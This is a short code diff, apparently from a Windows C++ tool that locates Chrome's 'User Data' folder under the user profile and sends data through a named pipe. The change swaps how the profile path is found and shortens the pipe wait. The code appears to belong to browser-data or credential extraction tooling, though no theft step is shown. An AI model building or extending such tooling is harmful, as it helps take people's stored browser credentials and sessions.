@@ -134,9 +134,9 @@ Browser get_browser() {
 void do_work() {
     try {
         Browser browser = get_browser();
-        char* user_profile_env = getenv("USERPROFILE");
-        if (!user_profile_env) return;
-        fs::path user_profile(user_profile_env);
+        wchar_t sz_path[MAX_PATH];
+        if (SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, sz_path) != S_OK) return;
+        fs::path user_profile(sz_path);
 
         fs::path data_path;
         if (browser == Browser::Chrome) data_path = user_profile / "AppData/Local/Google/Chrome/User Data";
@@ -169,7 +169,7 @@ void do_work() {
                     HANDLE h_pipe = INVALID_HANDLE_VALUE;
 
                     for (int i = 0; i < 10; i++) {
-                        if (WaitNamedPipeW(pipe_name, 2000)) {
+                        if (WaitNamedPipeW(pipe_name, 100)) {
                             h_pipe = CreateFileW(pipe_name, GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
                             if (h_pipe != INVALID_HANDLE_VALUE) break;
                         }
